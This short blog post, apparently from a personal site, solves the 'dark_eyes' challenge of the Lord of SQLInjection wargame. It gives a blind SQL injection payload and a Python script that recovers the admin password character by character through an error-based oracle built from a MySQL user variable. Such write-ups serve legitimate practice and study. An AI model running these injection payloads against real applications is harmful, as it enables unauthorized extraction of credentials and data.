---
title: "LOS dark_eyes"
date: 2020-08-07
tag: [pwnable]
layout: post
part: WEB
---
select id from prob_dark_eyes where id='admin' and pw='' or id ="admin" and 1=@a:=(pw like "%") or (select @a union select 1)#'
변수 이용

{% highlight python %}
import requests

url = "https://los.rubiya.kr/chall/dark_eyes_4e0c557b6751028de2e64d4d0020e02c.php"
cookies={"PHPSESSID":"7hmapfplqqubhhudbr837hol1s"}
# for i in range(100):
#   params = {"pw":"' or id ='admin' and 1=@a:=(length(pw)={}) or (select @a union select 1)#".format(str(i))}
#   r = requests.get(url=url, params=params, cookies=cookies)
#   if r.text != '':
#     print(r.text)
#     print(i)
#     break
st=""
for j in range(8):
  for i in range(48,127):
    params = {"pw":"' or id ='admin' and 1=@a:=(BINARY pw like '{}%') or (select @a union select 1)#".format(st+chr(i))}
    r = requests.get(url=url, params=params, cookies=cookies)
    if r.text != '':
      st+=chr(i)
      break
print(st)
{% endhighlight %}
